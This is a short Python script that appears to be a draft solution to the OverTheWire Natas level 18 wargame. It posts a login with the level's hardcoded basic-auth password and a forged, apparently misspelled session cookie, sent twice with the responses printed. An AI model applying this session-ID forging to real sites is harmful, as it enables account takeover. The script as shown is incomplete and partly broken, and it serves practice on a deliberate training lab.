import requests
from requests.auth import HTTPBasicAuth

s=requests.Session()
cookie = {"PHPSESsSID":"119"}


r = s.post(url = 'http://natas18.natas.labs.overthewire.org/index.php?debug', auth = HTTPBasicAuth("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"), data = {"username":'natas19', "password" : 'randi'}, cookies = cookie)

print(r.text)

r = s.post(url = 'http://natas18.natas.labs.overthewire.org/index.php?debug', auth = HTTPBasicAuth("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"), data = {"username":'natas19', "password" : 'randi'}, cookies = cookie)

print(r.text)



